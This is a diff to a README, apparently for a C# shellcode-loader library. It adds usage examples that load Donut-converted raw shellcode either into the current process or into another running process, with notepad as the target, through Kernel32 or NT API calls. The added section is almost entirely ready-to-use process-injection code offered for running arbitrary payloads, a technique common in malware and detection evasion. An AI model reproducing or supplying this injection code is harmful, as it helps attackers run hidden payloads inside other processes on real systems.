@@ -9,6 +9,23 @@ I added some test payloads which I've converted with
 * First with : Donut (https://github.com/TheWover/donut) : turns my payload into raw shellcode
 * Second with HxD Editor (https://mh-nexus.de/en/downloads.php?product=HxD20) : gives me an array of raw bytes from payloads converted with Donut
 
+How to use it ?
+
+For same process:
+
+```
+ShellCodeLoader.ShellCodeLoader cpp = new ShellCodeLoader.ShellCodeLoader(PayloadCpp64.rawData);
+cpp.LoadWithKernel32();//can be LoadWithNTDelegates , LoadWithKernel32Delegates or LoadWithNT
+cpp.Dispose();
+```
+For other processes:
+
+```
+Process Target = Process.GetProcessesByName("notepad")[0];
+ShellCodeLoader.ShellCodeLoaderEx cpp = new ShellCodeLoader.ShellCodeLoaderEx(Target, PayloadCpp64.rawData);
+cpp.LoadWithKernel32();//or cpp.LoadWithNT();
+cpp.Dispose();
+```
 
 Includes : 
 
